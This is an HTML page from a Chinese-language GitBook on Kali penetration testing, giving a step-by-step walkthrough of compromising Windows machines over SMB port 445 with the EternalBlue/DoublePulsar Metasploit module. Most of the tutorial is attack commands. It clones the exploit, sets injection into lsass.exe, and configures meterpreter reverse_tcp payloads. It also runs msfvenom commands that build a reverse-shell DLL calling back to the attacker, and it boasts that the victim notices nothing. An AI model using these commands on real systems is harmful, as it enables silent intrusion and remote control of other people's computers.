@@ -1,0 +1,384 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="ch3.html" />
+    
+    
+    <link rel="prev" href="ch2.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="ch1.html">
+            
+                <a href="ch1.html">
+            
+                    
+                    网络基础知识
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="ch1_1.html">
+            
+                <a href="ch1_1.html">
+            
+                    
+                    小结
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ch2.html">
+            
+                <a href="ch2.html">
+            
+                    
+                    Kali渗透测试
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1" data-path="ch2_1.html">
+            
+                <a href="ch2_1.html">
+            
+                    
+                    利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ch3.html">
+            
+                <a href="ch3.html">
+            
+                    
+                    超简单的Kali桌面美化教程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;metasploit&#x4E2D;&#x7684;eternalblue&#x548C;doublepulsar-exploit&#x8FDC;&#x7A0B;windows-pc"><b>1. </b>&#x5229;&#x7528;Metasploit&#x4E2D;&#x7684;Eternalblue&#x548C;Doublepulsar Exploit&#x8FDC;&#x7A0B;Windows PC</a></li><ul><li><span class="title-icon "></span><a href="#&#x5982;&#x4F55;&#x5229;&#x7528;eternalblue-doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><b>1.1. </b>&#x5982;&#x4F55;&#x5229;&#x7528;Eternalblue-Doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</a></li><li><span class="title-icon "></span><a href="#&#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;"><b>1.2. </b>&#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;</a></li><ul><li><span class="title-icon "></span><a href="#&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsarrb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;"><b>1.2.1. </b>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsar.rb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;</a></li></ul><li><span class="title-icon "></span><a href="#&#x63A5;&#x7740;&#x52A0;&#x8F7D;metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><b>1.3. </b>&#x63A5;&#x7740;&#x52A0;&#x8F7D;Metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</a></li><ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x6570;&#x8BB2;&#x89E3;"><b>1.3.1. </b>&#x53C2;&#x6570;&#x8BB2;&#x89E3;</a></li></ul></ul></ul></div><a href="#&#x5229;&#x7528;metasploit&#x4E2D;&#x7684;eternalblue&#x548C;doublepulsar-exploit&#x8FDC;&#x7A0B;windows-pc" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="&#x5229;&#x7528;metasploit&#x4E2D;&#x7684;eternalblue&#x548C;doublepulsar-exploit&#x8FDC;&#x7A0B;windows-pc"><a name="&#x5229;&#x7528;metasploit&#x4E2D;&#x7684;eternalblue&#x548C;doublepulsar-exploit&#x8FDC;&#x7A0B;windows-pc" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;metasploit&#x4E2D;&#x7684;eternalblue&#x548C;doublepulsar-exploit&#x8FDC;&#x7A0B;windows-pc"><i class="fa fa-link" aria-hidden="true"></i></a>1. &#x5229;&#x7528;Metasploit&#x4E2D;&#x7684;Eternalblue&#x548C;Doublepulsar Exploit&#x8FDC;&#x7A0B;Windows PC</h1>
+<h2 id="&#x5982;&#x4F55;&#x5229;&#x7528;eternalblue-doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><a name="&#x5982;&#x4F55;&#x5229;&#x7528;eternalblue-doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x5982;&#x4F55;&#x5229;&#x7528;eternalblue-doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x5982;&#x4F55;&#x5229;&#x7528;Eternalblue-Doublepulsar&#x5B8C;&#x6210;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</h2>
+<p>&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x4E86;&#x4E24;&#x4E2A;&#x5DE5;&#x5177;&#x201C;Eternalblue&#x201D;&#x548C;&#x201C;Doublepulsar&#x201D;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x201C;Eternalblue&#x201D;&#x5B83;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;windows&#x4E2D;&#x7684;&#x540E;&#x95E8;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x201C;Doublepulsar&#x201D;&#x5219;&#x7528;&#x4E8E;&#x5728;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x7684;&#x5E2E;&#x52A9;&#x4E0B;&#x6CE8;&#x5165;DLL&#x6587;&#x4EF6;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x5728;Metasploit&#x6846;&#x67B6;&#x4E2D;&#x624B;&#x52A8;&#x6DFB;&#x52A0;&#x6B64;&#x6F0F;&#x6D1E;</p>
+<p>&#x653B;&#x51FB;&#x8005;&#xFF1A;Kali  <strong>IP:192.168.43.196</strong></p>
+<p>victim&#xFF1A;&#x6240;&#x6709;&#x62E5;&#x6709;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;Windows&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;  <strong>IP:192.168.43.14</strong></p>
+<h2 id="&#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;"><a name="&#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x9996;&#x5148;&#x6211;&#x9700;&#x8981;&#x5148;&#x901A;&#x8FC7;github&#x83B7;&#x53D6;&#x8BE5;&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF0C;&#x5373;ruby&#x6587;&#x4EF6;</h2>
+<pre><code>git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
+</code></pre><p><img src="ch2/1/download.png" alt="clone">
+&#x7136;&#x540E;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5939;&#x5C06;eternalblue-doublepulsar.rb&#x6587;&#x4EF6;&#x52A0;&#x8F7D;&#x5230;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x53EA;&#x6709;&#x8FD9;&#x4E48;&#x505A;&#x624D;&#x53EF;&#x4EE5;&#x5728;Metasploit&#x4E2D;&#x6DFB;&#x52A0;&#x6B64;&#x6F0F;&#x6D1E;</p>
+<h3 id="&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsarrb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;"><a name="&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsarrb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;" class="anchor-navigation-ex-anchor" href="#&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsarrb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2.1. &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;eternalblue-doublepulsar.rb&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x8DEF;&#x5F84;</h3>
+<pre><code>/usr/share/metasploit-Framework/module/exploits/windows/smb
+</code></pre><p>&#x8FD8;&#x9700;&#x8981;&#x89C2;&#x5BDF;&#x5230;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;<strong>deps</strong>&#x7684;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x540E;&#x9762;&#x4F1A;&#x7528;&#x5230;
+<img src="ch2/1/yidong.png" alt="&#x8DEF;&#x5F84;"></p>
+<h2 id="&#x63A5;&#x7740;&#x52A0;&#x8F7D;metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><a name="&#x63A5;&#x7740;&#x52A0;&#x8F7D;metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x63A5;&#x7740;&#x52A0;&#x8F7D;metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x63A5;&#x7740;&#x52A0;&#x8F7D;Metasploit&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</h2>
+<pre><code>msfconsole
+</code></pre><p>&#x8BE5;&#x6A21;&#x5757;&#x901A;&#x8FC7;eternalblue&#x5229;&#x7528;SMBv1&#x548C;SMBv2&#x534F;&#x8BAE;&#x7684;&#x6F0F;&#x6D1E;&#x3002;&#x4E4B;&#x540E;&#xFF0C;doublepulsar&#x88AB;&#x7528;&#x4E8E;&#x8FDC;&#x7A0B;&#x6CE8;&#x5165;&#x6076;&#x610F;DLL</p>
+<p>Metasploit&#x6846;&#x67B6;&#x52A0;&#x8F7D;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x8F93;&#x5165;&#x8BE5;&#x547D;&#x4EE4;&#xFF0C;&#x4F7F;&#x5176;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x521A;&#x624D;&#x6DFB;&#x52A0;&#x7684;&#x6F0F;&#x6D1E;</p>
+<pre><code>reload_all
+</code></pre><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x8BE5;&#x547D;&#x4EE4;&#x641C;&#x7D22;&#x521A;&#x624D;&#x6DFB;&#x52A0;&#x7684;&#x6F0F;&#x6D1E;</p>
+<pre><code>search eternalblue_doublepulsar
+</code></pre><p><img src="ch2/1/sousuo.png" alt="&#x641C;&#x7D22;">
+&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x8DEF;&#x5F84;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;</p>
+<pre><code>use windows/smb/eternalblue_doublepulsar
+</code></pre><p><img src="ch2/1/canshu.png" alt="&#x53C2;&#x6570;"></p>
+<h3 id="&#x53C2;&#x6570;&#x8BB2;&#x89E3;"><a name="&#x53C2;&#x6570;&#x8BB2;&#x89E3;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x6570;&#x8BB2;&#x89E3;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.1. &#x53C2;&#x6570;&#x8BB2;&#x89E3;</h3>
+<p>1:<strong><em>ETERNALBLUEPATH</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x4E3A;/root/eternalblue_doublepulsar-metasploit/deps
+&#x6B64;&#x5904;&#x89C2;&#x5BDF;&#x5230;&#x4E0A;&#x9762;&#x6240;&#x63D0;&#x5230;&#x7684;deps&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x662F;&#x5C06;eternalblue_doublepulsar-metasploit&#x6587;&#x4EF6;&#x653E;&#x5728;&#x7528;&#x6237;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x5C31;&#x4E3A;/root/eternalblue_doublepulsar-metasploit/deps&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x662F;&#x5C06;eternalblue_doublepulsar-metasploit&#x6587;&#x4EF6;&#x653E;&#x5728;&#x4F60;&#x7684;Kali&#x684C;&#x9762;&#x4E0A;&#xFF0C;&#x8DEF;&#x5F84;&#x5373;&#x4E3A;/root/Desktop/eternalblue_doublepulsar-metasploit/deps&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;
+&#x6CE8;&#x610F;&#x66F4;&#x6539;&#x8DEF;&#x5F84;&#x4E0D;&#x80FD;&#x9519;&#xFF0C;&#x4E0D;&#x7136;&#x65E0;&#x6CD5;&#x6E17;&#x900F;&#x6210;&#x529F;</p>
+<p>2&#xFF1A;<strong><em>DOUBLEPULSARPATH</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x4E3A;/root/eternalblue_doublepulsar-metasploit/deps&#xFF0C;&#x4E5F;&#x8FD8;&#x662F;&#x63D0;&#x5230;&#x4E86;deps&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x548C;&#x4E0A;&#x8FF0;&#x4E00;&#x6837;&#x7684;&#x8BBE;&#x7F6E;&#x5373;&#x53EF;</p>
+<p>3&#xFF1A;<strong><em>PROCESSINJECT</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;lsass.exe&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x6839;&#x636E;&#x4F60;&#x9009;&#x62E9;&#x7684;victim&#x7684;&#x7CFB;&#x7EDF;&#x800C;&#x51B3;&#x5B9A;&#xFF0C;&#x5982;&#x679C;victim&#x7684;&#x7CFB;&#x7EDF;&#x4E3A;x64&#xFF0C;&#x5219;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;lsass.exe&#xFF0C;&#x5982;&#x679C;victim&#x7684;&#x7CFB;&#x7EDF;&#x4E3A;x86&#xFF0C;&#x5219;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;explorer.exe</p>
+<p>4&#xFF1A;<strong><em>TARGETARCHITECTURE</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x63CF;&#x8FF0;&#x7684;&#x662F;victim&#x7684;&#x7CFB;&#x7EDF;&#x7ED3;&#x6784;&#xFF0C;&#x5373;x64&#x8FD8;&#x662F;x86&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;x86&#xFF0C;&#x5982;&#x679C;victim&#x7684;&#x7CFB;&#x7EDF;&#x4E3A;x64&#xFF0C;&#x5219;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;x64&#xFF0C;&#x5982;&#x679C;victim&#x7684;&#x7CFB;&#x7EDF;&#x4E3A;x86&#xFF0C;&#x5219;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;x86</p>
+<p>5&#xFF1A;<strong><em>RHOST/RHOSTS</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x7684;&#x662F;victim&#x7684;IP&#x5730;&#x5740;</p>
+<p>6&#xFF1A;<strong><em>RPORT</em></strong>&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;445&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x53BB;&#x66F4;&#x6539;&#xFF0C;&#x56E0;&#x4E3A;&#x8BE5;&#x6F0F;&#x6D1E;&#x5C31;&#x662F;&#x5229;&#x7528;445&#x7AEF;&#x53E3;</p>
+<p>7&#xFF1A;<strong><em>WINEPATH</em></strong> &#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x662F;wine&#x8FD0;&#x884C;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8BBE;&#x7F6E;DLL&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4FEE;&#x6539;
+<img src="ch2/1/canshushezhi.png" alt="&#x53C2;&#x6570;&#x8BBE;&#x7F6E;"></p>
+<p>&#x5728;&#x4E0A;&#x8FF0;&#x8BBE;&#x7F6E;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x8BBE;&#x7F6E;payload
+&#x5BF9;&#x4E0E;payload&#x7684;&#x751F;&#x6210;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x6CE8;&#x610F;victim&#x7684;&#x7CFB;&#x7EDF;&#x67B6;&#x6784;&#x662F;x64&#x8FD8;&#x662F;x86&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<strong><em>msfvenom</em></strong>&#x751F;&#x6210;&#x5373;&#x53EF;</p>
+<p>x86&#x7684;payload&#x4E3A;&#xFF1A;</p>
+<pre><code>set payload windows/meterpreter/reverse_tcp
+</code></pre><p>x64&#x7684;payload&#x4E3A;&#xFF1A;</p>
+<pre><code>set payload windows/x64/meterpreter/reverse_tcp
+</code></pre><p>&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x8BBE;&#x7F6E;&#x672C;&#x5730;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x672C;&#x5730;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#xFF0C;&#x8BE5;&#x5730;&#x5740;&#x4E3A;Kali&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x672C;&#x5730;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x53EA;&#x8981;&#x9632;&#x706B;&#x5899;&#x6CA1;&#x6709;&#x5835;&#x585E;&#x7684;&#x7AEF;&#x53E3;&#x90FD;&#x53EF;&#x4EE5;</p>
+<pre><code>set LHOST=x.x.x.x
+
+set LPORT=4444
+</code></pre><p><img src="ch2/1/payload1.png" alt="payload&#x8BBE;&#x7F6E;">
+&#x6700;&#x540E;&#x6211;&#x4EEC;&#x8FD8;&#x8BB0;&#x5F97;&#x4E0A;&#x9762;&#x63D0;&#x5230;&#x7684;DLL&#x6587;&#x4EF6;&#x5417;&#xFF1F;
+&#x6211;&#x4EEC;&#x4E5F;&#x9700;&#x8981;&#x6839;&#x636E;victim&#x7684;&#x7CFB;&#x7EDF;&#x9009;&#x62E9;&#x751F;&#x6210;&#x8BE5;DLL&#x6587;&#x4EF6;</p>
+<p>x86&#x7684;DLL&#x6587;&#x4EF6;&#x4E3A;&#xFF1A;</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -o /root/.wine/drive_c/eternal11.dll
+</code></pre><p>x64&#x7684;DLL&#x6587;&#x4EF6;&#x4E3A;&#xFF1A;</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -o /root/.wine/drive_c/eternal11.dll
+</code></pre><p><img src="ch2/1/dll.png" alt="DLL&#x8BBE;&#x7F6E;">
+&#x4E07;&#x4E8B;&#x4FF1;&#x5907;&#xFF0C;&#x53EA;&#x6B20;&#x4E00;&#x6761;exploit&#x547D;&#x4EE4;</p>
+<pre><code>epxloit
+</code></pre><p><img src="ch2/1/metasploit.png" alt="&#x6E17;&#x900F;&#x6210;&#x529F;"></p>
+<p>&#x8FD9;&#x662F;&#x6B63;&#x5E38;&#x6E17;&#x900F;&#x6210;&#x529F;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x65E0;&#x9700;victim&#x4EFB;&#x4F55;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;victim&#x6BEB;&#x65E0;&#x53CD;&#x5E94;&#xFF0C;&#x4EFB;&#x4F55;&#x63D0;&#x793A;&#x90FD;&#x6CA1;&#x6709;</p>
+<p>&#x73B0;&#x5728;&#x6765;&#x67E5;&#x770B;&#x4E00;&#x4E0B;victim&#x7CFB;&#x7EDF;&#x4FE1;&#x606F;
+<img src="ch2/1/sysinfo.png" alt="&#x6E17;&#x900F;&#x6210;&#x529F;"></p>
+<p>&#x6E17;&#x900F;&#x6210;&#x529F;&#x4E86;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x8BB0;&#x4F4F;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x5173;&#x952E;&#x70B9;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x8FD9;&#x4E00;&#x6B21;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</p>
+<p>Enjoy It!!!</p>
+<p>&#x5982;&#x679C;&#x5E2E;&#x52A9;&#x5230;&#x4F60;&#x4E86;&#xFF0C;&#x5E0C;&#x671B;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4F60;&#x7684;&#x6253;&#x8D4F;&#xFF0C;&#x8C22;&#x8C22;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="ch2.html" class="navigation navigation-prev " aria-label="Previous page: Kali渗透测试">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="ch3.html" class="navigation navigation-next " aria-label="Next page: 超简单的Kali桌面美化教程">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC","level":"1.3.1","depth":2,"next":{"title":"超简单的Kali桌面美化教程","level":"1.4","depth":1,"path":"ch3.md","ref":"ch3.md","articles":[]},"previous":{"title":"Kali渗透测试","level":"1.3","depth":1,"path":"ch2.md","ref":"ch2.md","articles":[{"title":"利用Metasploit中的Eternalblue和Doublepulsar Exploit远程Windows PC","level":"1.3.1","depth":2,"path":"ch2_1.md","ref":"ch2_1.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["donate","-sharing","sharing-plus","anchor-navigation-ex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"donate":{"alipay":"/Pay/Ali.jpg","alipayText":"支付宝","button":"打赏","title":"","wechat":"/Pay/WeChat.png","wechatText":"微信"},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"anchor-navigation-ex":{"showLevel":true,"associatedWithSummary":true,"printLog":false,"multipleH1":true,"mode":"float","showGoTop":true,"float":{"floatIcon":"fa 